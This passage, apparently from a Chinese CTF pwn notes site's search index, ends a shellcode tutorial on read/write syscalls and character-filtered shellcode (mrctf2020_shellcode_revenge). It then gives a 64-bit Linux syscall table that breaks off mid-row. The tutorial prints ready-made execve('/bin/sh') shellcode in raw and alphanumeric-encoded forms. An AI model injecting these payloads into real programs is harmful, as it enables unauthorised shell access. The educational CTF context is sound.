|\n| 2 | `STDERR_FILENO` | 标准错误输出 | 终端屏幕（错误信息） |\n\n\n就像这样，所以一般我们用户开始使用程序的时候创建的fd都是从3开始的，不过最好就是调用完open函数后把eax或rax的值立刻放到read里面。而read的**第一参数**就是fd。fd里面有很多内容。\n\nread的**第二参数**是缓冲区地址，也就是我们要要把读取的数据存在哪里。是的，read其实是用来将读取的内容送到缓冲区的一个函数。一开始的时候，我们获得了fd，其代表哪一个文件被我们授权打开了，上面说到fd有很多的内容，在应用层面就是一个数字，但是这个数字可以指向一堆系统层面的东西，比如说这个fd指向的文件的信息，大小等等。所以我们获得fd的时候，也就获得了对这个文件的使用权限，read函数也就知道了读取什么了。\n\n然后我们把读取到的数据存到缓冲区地址。随后就是第三参数了：**第三参数**是读取的字节数量。也就是我要读取多少个数据。\n\nread的返回值是成功读取的参数数量，也就是字符长度。\n\n下面是Write函数：\n\n### write函数\n他的三个参数和read函数差不多。\n\n不过这里我们要注意，**第一参数**这里不是返回值，而是1，也就是标准输出。我们要将数据write到标准输出（终端屏幕）上。然后**第二参数**标注读取哪里的缓冲区的数据，读取**第三参数**的数量\n\n## shellcode变型\n这是最后一种类型的shellcode，和mrctf2020_shellcode类似（在上面栏目的普通shellcode里面），限度如shellcode，再call rax执行shellcode。\n\n他们的区别在，对输入的shellcode字符进行了过滤：只能输入特定的字符。\n\n这边的例题是：[mrctf2020_shellcode_revenge](/docx/mrctf2020_shellcode_revenge/)\n\n然后偷了大欢老师那边的现成的shellcode：\n\n```python\n#不可见版本\n#32 位 短字节 shellcode -> 21 字节\nb\"#\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"\n#64 位 较短的 shellcode 23 字节\nb\"#\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"\n\n#可见版本\n#x64 下的：\nb\"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\"\n#x32 下的：\nb\"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA\"\n```\n\n也可以用工具生成：[alpha3.py](/docx/alpha3.py/)\n\n\n\n还有一些比较特殊的shellcode，需要用XOR异或加密方法来构造，可以看笔记[[NewStarCTF 2023 公开赛道]shell code revenge](/docx/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/)，算是有点难度。\n\n# 总结\n1. 对于长度和字符没有限制的 shellcode，可以使用 pwntools 来生成或者搜索现成的 shellcode\n2. 长度有限制的 shellcode，可以对照系统调用表手写 shellcode\n3. 字符集有限制的 shellcode，可以使用 ALPHA3、msf 等工具对 shellcode 进行编码。或者根据限制的字符先生成可用的汇编指令再进行指令等价替换。\n\n","tags":["PWN攻略-主线","shellcode"],"categories":["PWN不出来"]},{"title":"syscall调用表64位","url":"//docx/syscall调用表64位/","content":"| **<font style=\"color:#4f4f4f;\">Num</font>** | **<font style=\"color:#4f4f4f;\">syscall</font>** | **<font style=\"color:#4f4f4f;\">%rax</font>** | **<font style=\"color:#4f4f4f;\">%rdi</font>** | **<font style=\"color:#4f4f4f;\">%rsi</font>** | **<font style=\"color:#4f4f4f;\">%rdx</font>** | **<font style=\"color:#4f4f4f;\">%rcx</font>** | **<font style=\"color:#4f4f4f;\">%r8</font>** | **<font style=\"color:#4f4f4f;\">%r9</font>** |\n| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |\n| <font style=\"color:#4f4f4f;\">0.</font> | <font style=\"color:#4f4f4f;\">sys_read</font> | <font style=\"color:#4f4f4f;\">0.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | | | |\n| <font style=\"color:#4f4f4f;\">1.</font> | <font style=\"color:#4f4f4f;\">sys_write</font> | <font style=\"color:#4f4f4f;\">1.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">const char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | | | |\n| <font style=\"color:#4f4f4f;\">2.</font> | <font style=\"color:#4f4f4f;\">sys_open</font> | <font style=\"color:#4f4f4f;\">2.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | |\n| <font style=\"color:#4f4f4f;\">3.</font> | <font style=\"color:#4f4f4f;\">sys_close</font> | <font style=\"color:#4f4f4f;\">3.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">4.</font> | <font style=\"color:#4f4f4f;\">sys_stat</font> | <font style=\"color:#4f4f4f;\">4.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat *statbuf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">5.</font> | <font style=\"color:#4f4f4f;\">sys_fstat</font> | <font style=\"color:#4f4f4f;\">5.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct stat *statbuf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">6.</font> | <font style=\"color:#4f4f4f;\">sys_lstat</font> | <font style=\"color:#4f4f4f;\">6.</font> | <font style=\"color:#4f4f4f;\">fconst char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat *statbuf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">7.</font> | <font style=\"color:#4f4f4f;\">sys_poll</font> | <font style=\"color:#4f4f4f;\">7.</font> | <font style=\"color:#4f4f4f;\">struct poll_fd *ufds</font> | <font style=\"color:#4f4f4f;\">unsigned int nfds</font> | <font style=\"color:#4f4f4f;\">long timeout_msecs</font> | | | |\n| <font style=\"color:#4f4f4f;\">8.</font> | <font style=\"color:#4f4f4f;\">sys_lseek</font> | <font style=\"color:#4f4f4f;\">8.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">off_t offset</font> | <font style=\"color:#4f4f4f;\">unsigned int origin</font> | | | |\n| <font style=\"color:#4f4f4f;\">9.</font> | <font style=\"color:#4f4f4f;\">sys_mmap</font> | <font style=\"color:#4f4f4f;\">9.</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long len</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">unsigned long off</font> |\n| <font style=\"color:#4f4f4f;\">10.</font> | <font style=\"color:#4f4f4f;\">sys_mprotect</font> | <font style=\"color:#4f4f4f;\">10.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | | | |\n| <font style=\"color:#4f4f4f;\">11.</font> | <font style=\"color:#4f4f4f;\">sys_munmap</font> | <font style=\"color:#4f4f4f;\">11.</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">12.</font> | <font style=\"color:#4f4f4f;\">sys_brk</font> | <font style=\"color:#4f4f4f;\">12.</font> | <font style=\"color:#4f4f4f;\">unsigned long brk</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">13.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigaction</font> | <font style=\"color:#4f4f4f;\">13.</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">const struct sigaction *act</font> | <font style=\"color:#4f4f4f;\">struct sigaction *oact</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | | |\n| <font style=\"color:#4f4f4f;\">14.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigprocmask</font> | <font style=\"color:#4f4f4f;\">14.</font> | <font style=\"color:#4f4f4f;\">int how</font> | <font style=\"color:#4f4f4f;\">sigset_t *nset</font> | <font style=\"color:#4f4f4f;\">sigset_t *oset</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | | |\n| <font style=\"color:#4f4f4f;\">15.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigreturn</font> | <font style=\"color:#4f4f4f;\">15.</font> | <font style=\"color:#4f4f4f;\">unsigned long __unused</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">16.</font> | <font style=\"color:#4f4f4f;\">sys_ioctl</font> | <font style=\"color:#4f4f4f;\">16.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg</font> | | | |\n| <font style=\"color:#4f4f4f;\">17.</font> | <font style=\"color:#4f4f4f;\">sys_pread64</font> | <font style=\"color:#4f4f4f;\">17.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">loff_t pos</font> | | |\n| <font style=\"color:#4f4f4f;\">18.</font> | <font style=\"color:#4f4f4f;\">sys_pwrite64</font> | <font style=\"color:#4f4f4f;\">18.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">const char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">loff_t pos</font> | | |\n| <font style=\"color:#4f4f4f;\">19.</font> | <font style=\"color:#4f4f4f;\">sys_readv</font> | <font style=\"color:#4f4f4f;\">19.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | | | |\n| <font style=\"color:#4f4f4f;\">20.</font> | <font style=\"color:#4f4f4f;\">sys_writev</font> | <font style=\"color:#4f4f4f;\">20.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | | | |\n| <font style=\"color:#4f4f4f;\">21.</font> | <font style=\"color:#4f4f4f;\">sys_access</font> | <font style=\"color:#4f4f4f;\">21.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | | |\n| <font style=\"color:#4f4f4f;\">22.</font> | <font style=\"color:#4f4f4f;\">sys_pipe</font> | <font style=\"color:#4f4f4f;\">22.</font> | <font style=\"color:#4f4f4f;\">int *filedes</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">23.</font> | <font style=\"color:#4f4f4f;\">sys_select</font> | <font style=\"color:#4f4f4f;\">23.</font> | <font style=\"color:#4f4f4f;\">int n</font> | <font style=\"color:#4f4f4f;\">fd_set *inp</font> | <font style=\"color:#4f4f4f;\">fd_set *outp</font> | <font style=\"color:#4f4f4f;\">fd_set*exp</font> | <font style=\"color:#4f4f4f;\">struct timeval *tvp</font> | |\n| <font style=\"color:#4f4f4f;\">24.</font> | <font style=\"color:#4f4f4f;\">sys_sched_yield</font> | <font style=\"color:#4f4f4f;\">24.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">25.</font> | <font style=\"color:#4f4f4f;\">sys_mremap</font> | <font style=\"color:#4f4f4f;\">25.</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long old_len</font> | <font style=\"color:#4f4f4f;\">unsigned long new_len</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">unsigned long new_addr</font> | |\n| <font style=\"color:#4f4f4f;\">26.</font> | <font style=\"color:#4f4f4f;\">sys_msync</font> | <font style=\"color:#4f4f4f;\">26.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | |\n| <font style=\"color:#4f4f4f;\">27.</font> | <font style=\"color:#4f4f4f;\">sys_mincore</font> | <font style=\"color:#4f4f4f;\">27.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned char *vec</font> | | | |\n| <font style=\"color:#4f4f4f;\">28.</font> | <font style=\"color:#4f4f4f;\">sys_madvise</font> | <font style=\"color:#4f4f4f;\">28.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len_in</font> | <font style=\"color:#4f4f4f;\">int behavior</font> | | | |\n| <font style=\"color:#4f4f4f;\">29.</font> | <font style=\"color:#4f4f4f;\">sys_shmget</font> | <font style=\"color:#4f4f4f;\">29.</font> | <font style=\"color:#4f4f4f;\">key_t key</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int shmflg</font> | | | |\n| <font style=\"color:#4f4f4f;\">30.</font> | <font style=\"color:#4f4f4f;\">sys_shmat</font> | <font style=\"color:#4f4f4f;\">30.</font> | <font style=\"color:#4f4f4f;\">int shmid</font> | <font style=\"color:#4f4f4f;\">char *shmaddr</font> | <font style=\"color:#4f4f4f;\">int shmflg</font> | | | |\n| <font style=\"color:#4f4f4f;\">31.</font> | <font style=\"color:#4f4f4f;\">sys_shmctl</font> | <font style=\"color:#4f4f4f;\">31.</font> | <font style=\"color:#4f4f4f;\">int shmid</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">struct shmid_ds *buf</font> | | | |\n| <font style=\"color:#4f4f4f;\">32.</font> | <font style=\"color:#4f4f4f;\">sys_dup</font> | <font style=\"color:#4f4f4f;\">32.</font> | <font style=\"color:#4f4f4f;\">unsigned int fildes</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">33.</font> | <font style=\"color:#4f4f4f;\">sys_dup2</font> | <font style=\"color:#4f4f4f;\">33.</font> | <font style=\"color:#4f4f4f;\">unsigned int oldfd</font> | <font style=\"color:#4f4f4f;\">unsigned int newfd</font> | | | | |\n| <font style=\"color:#4f4f4f;\">34.</font> | <font style=\"color:#4f4f4f;\">sys_pause</font> | <font style=\"color:#4f4f4f;\">34.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">35.</font> | <font style=\"color:#4f4f4f;\">sys_nanosleep</font> | <font style=\"color:#4f4f4f;\">35.</font> | <font style=\"color:#4f4f4f;\">struct timespec *rqtp</font> | <font style=\"color:#4f4f4f;\">struct timespec *rmtp</font> | | | | |\n| <font style=\"color:#4f4f4f;\">36.</font> | <font style=\"color:#4f4f4f;\">sys_getitimer</font> | <font style=\"color:#4f4f4f;\">36.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">struct itimerval *value</font> | | | | |\n| <font style=\"color:#4f4f4f;\">37.</font> | <font style=\"color:#4f4f4f;\">sys_alarm</font> | <font style=\"color:#4f4f4f;\">37.</font> | <font style=\"color:#4f4f4f;\">unsigned int seconds</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">38.</font> | <font style=\"color:#4f4f4f;\">sys_setitimer</font> | <font style=\"color:#4f4f4f;\">38.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">struct itimerval *value</font> | <font style=\"color:#4f4f4f;\">struct itimerval *ovalue</font> | | | |\n| <font style=\"color:#4f4f4f;\">39.</font> | <font style=\"color:#4f4f4f;\">sys_getpid</font> | <font style=\"color:#4f4f4f;\">39.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">40.</font> | <font style=\"color:#4f4f4f;\">sys_sendfile</font> | <font style=\"color:#4f4f4f;\">40.</font> | <font style=\"color:#4f4f4f;\">int out_fd</font> | <font style=\"color:#4f4f4f;\">int in_fd</font> | <font style=\"color:#4f4f4f;\">off_t *offset</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | | |\n| <font style=\"color:#4f4f4f;\">41.</font> | <font style=\"color:#4f4f4f;\">sys_socket</font> | <font style=\"color:#4f4f4f;\">41.</font> | <font style=\"color:#4f4f4f;\">int family</font> | <font style=\"color:#4f4f4f;\">int type</font> | <font style=\"color:#4f4f4f;\">int protocol</font> | | | |\n| <font style=\"color:#4f4f4f;\">42.</font> | <font style=\"color:#4f4f4f;\">sys_connect</font> | <font style=\"color:#4f4f4f;\">42.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *uservaddr</font> | <font style=\"color:#4f4f4f;\">int addrlen</font> | | | |\n| <font style=\"color:#4f4f4f;\">43.</font> | <font style=\"color:#4f4f4f;\">sys_accept</font> | <font style=\"color:#4f4f4f;\">43.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *upeer_sockaddr</font> | <font style=\"color:#4f4f4f;\">int *upeer_addrlen</font> | | | |\n| <font style=\"color:#4f4f4f;\">44.</font> | <font style=\"color:#4f4f4f;\">sys_sendto</font> | <font style=\"color:#4f4f4f;\">44.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">void *buff</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *addr</font> | <font style=\"color:#4f4f4f;\">int addr_len</font> |\n| <font style=\"color:#4f4f4f;\">45.</font> | <font style=\"color:#4f4f4f;\">sys_recvfrom</font> | <font style=\"color:#4f4f4f;\">45.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">void *ubuf</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *addr</font> | <font style=\"color:#4f4f4f;\">int *addr_len</font> |\n| <font style=\"color:#4f4f4f;\">46.</font> | <font style=\"color:#4f4f4f;\">sys_sendmsg</font> | <font style=\"color:#4f4f4f;\">46.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct msghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | | | |\n| <font style=\"color:#4f4f4f;\">47.</font> | <font style=\"color:#4f4f4f;\">sys_recvmsg</font> | <font style=\"color:#4f4f4f;\">47.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct msghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | | | |\n| <font style=\"color:#4f4f4f;\">48.</font> | <font style=\"color:#4f4f4f;\">sys_shutdown</font> | <font style=\"color:#4f4f4f;\">48.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int how</font> | | | | |\n| <font style=\"color:#4f4f4f;\">49.</font> | <font style=\"color:#4f4f4f;\">sys_bind</font> | <font style=\"color:#4f4f4f;\">49.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sokaddr *umyaddr</font> | <font style=\"color:#4f4f4f;\">int addrlen</font> | | | |\n| <font style=\"color:#4f4f4f;\">50.</font> | <font style=\"color:#4f4f4f;\">sys_listen</font> | <font style=\"color:#4f4f4f;\">50.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int backlog</font> | | | | |\n| <font style=\"color:#4f4f4f;\">51.</font> | <font style=\"color:#4f4f4f;\">sys_getsockname</font> | <font style=\"color:#4f4f4f;\">51.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *usockaddr</font> | <font style=\"color:#4f4f4f;\">int *usockaddr_len</font> | | | |\n| <font style=\"color:#4f4f4f;\">52.</font> | <font style=\"color:#4f4f4f;\">sys_getpeername</font> | <font style=\"color:#4f4f4f;\">52.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *usockaddr</font> | <font style=\"color:#4f4f4f;\">int *usockaddr_len</font> | | | |\n| <font style=\"color:#4f4f4f;\">53.</font> | <font style=\"color:#4f4f4f;\">sys_socketpair</font> | <font style=\"color:#4f4f4f;\">53.</font> | <font style=\"color:#4f4f4f;\">int family</font> | <font style=\"color:#4f4f4f;\">int type</font> | <font style=\"color:#4f4f4f;\">int protocol</font> | <font style=\"color:#4f4f4f;\">int *usockvec</font> | | |\n| <font style=\"color:#4f4f4f;\">54.</font> | <font style=\"color:#4f4f4f;\">sys_setsockopt</font> | <font style=\"color:#4f4f4f;\">54.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int level</font> | <font style=\"color:#4f4f4f;\">int optname</font> | <font style=\"color:#4f4f4f;\">char *optval</font> | <font style=\"color:#4f4f4f;\">int optlen</font> | |\n| <font style=\"color:#4f4f4f;\">55.</font> | <font style=\"color:#4f4f4f;\">sys_getsockopt</font> | <font style=\"color:#4f4f4f;\">55.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int level</font> | <font style=\"color:#4f4f4f;\">int optname</font> | <font style=\"color:#4f4f4f;\">char *optval</font> | <font style=\"color:#4f4f4f;\">int *optlen</font> | |\n| <font style=\"color:#4f4f4f;\">56.</font> | <font style=\"color:#4f4f4f;\">sys_clone</font> | <font style=\"color:#4f4f4f;\">56.</font> | <font style=\"color:#4f4f4f;\">unsigned long clone_flags</font> | <font style=\"color:#4f4f4f;\">unsigned long newsp</font> | <font style=\"color:#4f4f4f;\">void *parent_tid</font> | <font style=\"color:#4f4f4f;\">void *child_tid</font> | | |\n| <font style=\"color:#4f4f4f;\">57.</font> | <font style=\"color:#4f4f4f;\">sys_fork</font> | <font style=\"color:#4f4f4f;\">57.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">58.</font> | <font style=\"color:#4f4f4f;\">sys_vfork</font> | <font style=\"color:#4f4f4f;\">58.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">59.</font> | <font style=\"color:#4f4f4f;\">sys_execve</font> | <font style=\"color:#4f4f4f;\">59.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">const char *const argv[]</font> | <font style=\"color:#4f4f4f;\">const char *const envp[]</font> | | | |\n| <font style=\"color:#4f4f4f;\">60.</font> | <font style=\"color:#4f4f4f;\">sys_exit</font> | <font style=\"color:#4f4f4f;\">60.</font> | <font style=\"color:#4f4f4f;\">int error_code</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">61.</font> | <font style=\"color:#4f4f4f;\">sys_wait4</font> | <font style=\"color:#4f4f4f;\">61.</font> | <font style=\"color:#4f4f4f;\">pid_t upid</font> | <font style=\"color:#4f4f4f;\">int *stat_addr</font> | <font style=\"color:#4f4f4f;\">int options</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | | |\n| <font style=\"color:#4f4f4f;\">62.</font> | <font style=\"color:#4f4f4f;\">sys_kill</font> | <font style=\"color:#4f4f4f;\">62.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | | | | |\n| <font style=\"color:#4f4f4f;\">63.</font> | <font style=\"color:#4f4f4f;\">sys_uname</font> | <font style=\"color:#4f4f4f;\">63.</font> | <font style=\"color:#4f4f4f;\">struct old_utsname *name</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">64.</font> | <font style=\"color:#4f4f4f;\">sys_semget</font> | <font style=\"color:#4f4f4f;\">64.</font> | <font style=\"color:#4f4f4f;\">key_t key</font> | <font style=\"color:#4f4f4f;\">int nsems</font> | <font style=\"color:#4f4f4f;\">int semflg</font> | | | |\n| <font style=\"color:#4f4f4f;\">65.</font> | <font style=\"color:#4f4f4f;\">sys_semop</font> | <font style=\"color:#4f4f4f;\">65.</font> | <font style=\"color:#4f4f4f;\">int semid</font> | <font style=\"color:#4f4f4f;\">struct sembuf *tsops</font> | <font style=\"color:#4f4f4f;\">unsigned nsops</font> | | | |\n| <font style=\"color:#4f4f4f;\">66.</font> | <font style=\"color:#4f4f4f;\">sys_semctl</font> | <font style=\"color:#4f4f4f;\">66.</font> | <font style=\"color:#4f4f4f;\">int semid</font> | <font style=\"color:#4f4f4f;\">int semnum</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">union semun arg</font> | | |\n| <font style=\"color:#4f4f4f;\">67.</font> | <font style=\"color:#4f4f4f;\">sys_shmdt</font> | <font style=\"color:#4f4f4f;\">67.</font> | <font style=\"color:#4f4f4f;\">char *shmaddr</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">68.</font> | <font style=\"color:#4f4f4f;\">sys_msgget</font> | <font style=\"color:#4f4f4f;\">68.</font> | <font style=\"color:#4f4f4f;\">key_t key</font> | <font style=\"color:#4f4f4f;\">int msgflg</font> | | | | |\n| <font style=\"color:#4f4f4f;\">69.</font> | <font style=\"color:#4f4f4f;\">sys_msgsnd</font> | <font style=\"color:#4f4f4f;\">69.</font> | <font style=\"color:#4f4f4f;\">int msqid</font> | <font style=\"color:#4f4f4f;\">struct msgbuf *msgp</font> | <font style=\"color:#4f4f4f;\">size_t msgsz</font> | <font style=\"color:#4f4f4f;\">int msgflg</font> | | |\n| <font style=\"color:#4f4f4f;\">70.</font> | <font style=\"color:#4f4f4f;\">sys_msgrcv</font> | <font style=\"color:#4f4f4f;\">70.</font> | <font style=\"color:#4f4f4f;\">int msqid</font> | <font style=\"color:#4f4f4f;\">struct msgbuf *msgp</font> | <font style=\"color:#4f4f4f;\">size_t msgsz</font> | <font style=\"color:#4f4f4f;\">long msgtyp</font> | <font style=\"color:#4f4f4f;\">int msgflg</font> | |\n| <font style=\"color:#4f4f4f;\">71.</font> | <font style=\"color:#4f4f4f;\">sys_msgctl</font> | <font style=\"color:#4f4f4f;\">71.</font> | <font style=\"color:#4f4f4f;\">int msqid</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">struct msqid_ds *buf</font> | | | |\n| <font style=\"color:#4f4f4f;\">72.</font> | <font style=\"color:#4f4f4f;\">sys_fcntl</font> | <font style=\"color:#4f4f4f;\">72.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg</font> | | | |\n| <font style=\"color:#4f4f4f;\">73.</font> | <font style=\"color:#4f4f4f;\">sys_flock</font> | <font style=\"color:#4f4f4f;\">73.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | | | | |\n| <font style=\"color:#4f4f4f;\">74.</font> | <font style=\"color:#4f4f4f;\">sys_fsync</font> | <font style=\"color:#4f4f4f;\">74.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">75.</font> | <font style=\"color:#4f4f4f;\">sys_fdatasync</font> | <font style=\"color:#4f4f4f;\">75.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">76.</font> | <font style=\"color:#4f4f4f;\">sys_truncate</font> | <font style=\"color:#4f4f4f;\">76.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">long length</font> | | | | |\n| <font style=\"color:#4f4f4f;\">77.</font> | <font style=\"color:#4f4f4f;\">sys_ftruncate</font> | <font style=\"color:#4f4f4f;\">77.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned long length</font> | | | | |\n| <font style=\"color:#4f4f4f;\">78.</font> | <font style=\"color:#4f4f4f;\">sys_getdents</font> | <font style=\"color:#4f4f4f;\">78.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct linux_dirent *dirent</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | | | |\n| <font style=\"color:#4f4f4f;\">79.</font> | <font style=\"color:#4f4f4f;\">sys_getcwd</font> | <font style=\"color:#4f4f4f;\">79.</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">unsigned long size</font> | | | | |\n| <font style=\"color:#4f4f4f;\">80.</font> | <font style=\"color:#4f4f4f;\">sys_chdir</font> | <font style=\"color:#4f4f4f;\">80.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">81.</font> | <font style=\"color:#4f4f4f;\">sys_fchdir</font> | <font style=\"color:#4f4f4f;\">81.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">82.</font> | <font style=\"color:#4f4f4f;\">sys_rename</font> | <font style=\"color:#4f4f4f;\">82.</font> 